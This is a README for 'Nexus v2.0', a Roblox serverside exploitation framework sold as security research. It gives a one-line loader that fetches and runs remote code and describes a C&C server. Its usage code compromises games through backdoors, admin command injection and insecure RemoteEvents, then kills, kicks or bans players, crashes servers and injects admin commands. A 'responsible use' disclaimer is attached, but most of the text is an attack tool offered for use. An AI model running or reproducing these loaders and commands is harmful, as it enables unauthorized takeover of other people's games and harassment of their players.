# Nexus v2.0
## Advanced Roblox Serverside Research Framework

Nexus is a comprehensive security research tool for analyzing and testing Roblox game vulnerabilities. Built for security researchers, penetration testers, and game developers who need to understand serverside exploitation vectors.

---

## Features

### Core Capabilities
- **Deep Vulnerability Scanning** — Advanced pattern matching engine that identifies real serverside vectors including admin system exploits, MainModule backdoors, attribute-based payloads, and insecure RemoteEvent handlers
- **Multi-Vector Exploitation** — Automated compromise chains targeting admin command injection, require() backdoors, and gamepass code execution
- **Professional UI** — Modern, clean interface with smooth animations and intuitive controls
- **Serverside Execution** — Full Lua execution with server privileges after successful compromise
- **Real-time Monitoring** — Live status updates and execution history tracking

### Detection Capabilities

**Admin System Analysis**
- HD Admin command injection
- Adonis vulnerability detection
- Kohls Admin exploit vectors
- Custom admin system identification

**Backdoor Detection**
- External module loading via require()
- Remote code execution patterns
- Dynamic loadstring() usage
- Environment manipulation
- Global namespace pollution
- Attribute-based payload storage

**RemoteEvent Analysis**
- Insecure event handlers
- Validation bypass opportunities
- Client-to-server exploit vectors

**Code Quality Analysis**
- Shannon entropy calculation
- Obfuscation detection
- Suspicious string pattern identification
- Base64 encoding detection

---

## Quick Start

### One-Line Loader

```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader_v2.lua"))()
```

**GUI Toggle:** Press `Right Shift`

---

## Installation

### GitHub Setup

1. **Fork this repository**
2. **Update the repository URL** in `loader_v2.lua`:
   ```lua
   local GITHUB_REPO = "YOUR_USERNAME/ProjectNexus"
   ```
3. **Push to your GitHub**
4. **Load in-game** with the loadstring above

### Project Structure

```
ProjectNexus/
├── core/
│   ├── scanner.lua          # Vulnerability detection engine
│   ├── injector.lua         # Backdoor deployment system
│   ├── executor.lua         # Serverside command execution
│   └── connection.lua       # C&C communication layer
├── client/
│   └── gui.lua              # Professional user interface
├── server/
│   └── command_server.py    # Python C&C server (optional)
├── examples/
│   ├── basic_usage.lua
│   └── advanced_injection.lua
├── main.lua                 # Core framework
├── loader_v2.lua            # Standalone loader
└── README.md
```

---

## Usage

### Basic Workflow

```lua
-- Load Nexus
loadstring(game:HttpGet("YOUR_LOADER_URL"))()

-- Access instance
local nexus = _G.NexusInstance

-- Scan current game
local scan = nexus:ScanCurrentGame()
print("Exploitability:", scan.rating)
print("Backdoors found:", #scan.backdoors)

-- Attempt compromise
if nexus:Compromise() then
    print("Game compromised")
    
    -- Execute serverside code
    nexus:Execute([[
        print("Running serverside")
        game.Workspace.Baseplate.BrickColor = BrickColor.new("Really red")
    ]])
end
```

### Scanner Usage

```lua
-- Get detailed scan results
local results = nexus:ScanCurrentGame()

-- Access specific findings
for _, backdoor in ipairs(results.backdoors) do
    print(string.format("[%s] %s (Severity: %d)",
        backdoor.type, backdoor.script, backdoor.severity))
end

-- Check for admin systems
for _, admin in ipairs(results.adminSystems) do
    print(string.format("Found: %s at %s (Exploitable: %s)",
        admin.system, admin.location, admin.exploitable))
end

-- Export results
local report = nexus.scanner:ExportResults(results, "text")
print(report)
```

### Execution Commands

```lua
-- Direct code execution
nexus:Execute([[
    -- Any serverside Lua code
    local Players = game:GetService("Players")
    print("Player count:", #Players:GetPlayers())
]])

-- Quick commands
nexus:Command("kill", "PlayerName")
nexus:Command("kick", "PlayerName", "Reason")
nexus:Command("ban", "PlayerName")
nexus:Command("admin")  -- Inject admin system
nexus:Command("crash", "memory")
```

---

## Detection Patterns

### Critical Severity (9-10)

- `require(assetId)` — External module injection
- `loadstring(game:HttpGet(...))` — Remote code execution
- `MarketplaceService:UserOwnsGamePassAsync` with `loadstring` — Gamepass exploit
- `:SetAttribute()` with executable code — Attribute payload storage

### High Severity (7-8)

- Chat command listeners without authentication
- Environment manipulation (`getfenv`/`setfenv`)
- Global namespace injection (`_G[...]` assignments)
- Attribute-based control flows

### Medium Severity (5-6)

- Exposed RemoteEvents in ReplicatedStorage
- DataStore access patterns
- Debug library usage

### Pattern Recognition

The scanner uses multi-layered detection:
1. **Static Analysis** — Regex pattern matching against known exploit signatures
2. **Entropy Analysis** — Shannon entropy calculation to identify obfuscation
3. **String Analysis** — Detection of suspicious encoding patterns
4. **Structural Analysis** — Identification of exploit-prone architectures

---

## Compromise Methods

### Backdoor Exploitation
Targets existing backdoors in the game by:
- Identifying loadstring() patterns
- Analyzing require() chains
- Detecting MainModule vulnerabilities
- Exploiting attribute-based code storage

### RemoteEvent Exploitation
Finds and exploits insecure remote handlers:
- Scans for exposed RemoteEvents
- Tests for missing validation
- Attempts parameter injection

### Admin Command Injection
Exploits chat-based admin systems:
- Identifies command prefixes
- Tests authentication bypass
- Injects malicious commands

---

## Executor Functions

### Player Control
```lua
-- Kill player
executor:KillPlayer("Username")

-- Teleport player
executor:TeleportPlayer("Username", Vector3.new(0, 50, 0))

-- Kick/ban
executor:KickPlayer("Username", "Reason")
executor:BanPlayer("Username")

-- Give item
executor:GiveItem("Username", 123456)  -- Asset ID
```

### Server Control
```lua
-- Crash methods
executor:CrashServer("memory")         -- Memory exhaustion
executor:CrashServer("infinite_loop")  -- Tight loop
executor:CrashServer("recursive")      -- Stack overflow
executor:CrashServer("part_spam")      -- Part flood

-- Admin injection
executor:InjectAdminCommands()
-- Adds chat commands: :kill, :tp, :god, :speed, :respawn
```

### Mass Operations
```lua
-- Execute on all players
executor:ExecuteOnAllPlayers([[
    character.Humanoid.WalkSpeed = 100
]])

-- Workspace manipulation
executor:ManipulateWorkspace([[
    for _, part in ipairs(Workspace:GetDescendants()) do
        if part:IsA("BasePart") then
            part.BrickColor = BrickColor.new("Really red")
        end
    end
]])
```

---

## GUI Interface

### Features

- **Modern Design** — Professional dark theme with smooth animations
- **Multiple Tabs** — Executor, Scanner, Commands, Status
- **Real-time Status** — Live connection and compromise status indicators
- **Code Editor** — Syntax-highlighted editor for serverside code
- **Quick Commands** — One-click player manipulation and server control

### Keyboard Shortcuts

- `Right Shift` — Toggle GUI visibility
- Drag title bar to move window

---

## Technical Details

### Scanner Architecture

The vulnerability scanner operates in four phases:

**Phase 1: Admin System Detection**
- Scans for known admin system markers
- Analyzes command handling code
- Tests for authentication bypass vectors

**Phase 2: Script Analysis**
- Deep pattern matching across all scripts
- Entropy calculation for obfuscation detection
- MainModule identification

**Phase 3: Remote Analysis**
- RemoteEvent/Function enumeration
- Handler validation checks
- Exploitation vector assessment

**Phase 4: Attribute Scanning**
- Instance attribute enumeration
- Payload detection in attribute values
- Base64/encoded content identification

### Scoring System

Each vulnerability contributes to an overall exploitability score:

- Admin system: +15 points
- Critical backdoor pattern: +9-10 points
- MainModule: +12 points
- Suspicious attribute: +8 points
- Vulnerable remote: +3-6 points
- Obfuscated script: +3 points

**Ratings:**
- `CRITICAL`: Score ≥ 80
- `HIGH`: Score ≥ 50
- `MEDIUM`: Score ≥ 25
- `LOW`: Score ≥ 10
- `CLEAN`: Score < 10

---

## Security Research

This tool is designed for:

- **Game Developers** — Testing your own games for vulnerabilities
- **Security Researchers** — Understanding Roblox exploitation techniques
- **Penetration Testers** — Assessing game security with permission
- **Educational Purposes** — Learning about serverside security

### Responsible Use

- Only test games you own or have explicit permission to test
- Do not use this tool to harm other players or developers
- Report discovered vulnerabilities responsibly
- Understand that unauthorized access violates Roblox Terms of Service

---

## Examples

### Example 1: Basic Scanning

```lua
loadstring(game:HttpGet("YOUR_LOADER_URL"))()
local nexus = _G.NexusInstance

local results = nexus:ScanCurrentGame()
print(nexus.scanner:ExportResults(results, "text"))
```

### Example 2: Automated Compromise

```lua
local nexus = _G.NexusInstance

-- Try all exploit vectors
if nexus:Compromise() then
    -- Inject admin commands
    nexus:Command("admin")
    
    -- Give yourself god mode
    nexus:Execute([[
        local player = game.Players.LocalPlayer
        if player.Character then
            player.Character.Humanoid.MaxHealth = math.huge
            player.Character.Humanoid.Health = math.huge
        end
    ]])
end
```

### Example 3: Remote Monitoring

```lua
local nexus = _G.NexusInstance
local results = nexus:ScanCurrentGame()

-- Monitor all vulnerable remotes
for _, remote in ipairs(results.remotes) do
    print("Monitoring:", remote.path)
    -- Set up custom handlers here
end
```

---

## Known Limitations

1. **Client-Side Only** — Scanner runs from client, cannot verify serverside validation
2. **Pattern-Based** — May miss novel or heavily obfuscated backdoors
3. **False Positives** — Legitimate admin systems may be flagged as exploitable
4. **Detection Risk** — Active scanning may trigger anti-cheat systems
5. **Roblox Updates** — New security features may break exploitation techniques

---

## Version History

**v2.0** (Current)
- Complete codebase rewrite
- Professional UI redesign
- Enhanced vulnerability detection
- Admin system exploitation
- Attribute-based backdoor detection
- Improved pattern matching engine
- Real-time status monitoring
- Better error handling

**v1.0**
- Initial release
- Basic scanning and exploitation
- Simple GUI
- Remote execution framework

---

## Credits

Built with research from:
- Roblox Developer Forum security discussions
- Public vulnerability disclosure reports
- Serverside exploitation case studies
- Admin system source code analysis

---

## Disclaimer

This software is provided for educational and security research purposes. The authors are not responsible for any misuse or damage caused by this tool. Use only on games you own or have explicit written permission to test. Unauthorized access to Roblox games violates the Terms of Service and may result in account termination or legal action.

---

## License

This project is released for educational purposes. By using this software, you agree to use it responsibly and ethically.
